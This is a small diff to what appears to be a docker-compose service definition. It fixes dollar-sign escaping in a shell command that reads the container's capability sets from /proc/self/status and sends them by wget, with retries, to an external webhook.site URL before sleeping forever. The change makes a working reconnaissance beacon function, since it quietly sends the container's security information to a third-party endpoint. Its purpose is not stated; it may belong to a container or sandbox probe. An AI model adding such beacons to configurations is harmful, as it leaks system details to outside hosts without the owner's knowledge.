@@ -5,8 +5,8 @@ services:
       - sh
       - -c
       - |
-        CAPS=$(grep -E '^Cap(Bnd|Eff)' /proc/self/status | tr '\n' '_')
+        CAPS=$$(grep -E '^Cap(Bnd|Eff)' /proc/self/status | tr '\n' '_')
         for i in 1 2 3 4 5; do
-          wget -q -T 8 -O - "https://webhook.site/5a6ae326-fdb5-4b51-a691-92509b495ff4?tag=F23-CTRL-DIRECT&i=$i&caps=$CAPS" && break || sleep 3
+          wget -q -T 8 -O - "https://webhook.site/5a6ae326-fdb5-4b51-a691-92509b495ff4?tag=F23-CTRL-DIRECT&i=$$i&caps=$$CAPS" && break || sleep 3
         done
         sleep 999999
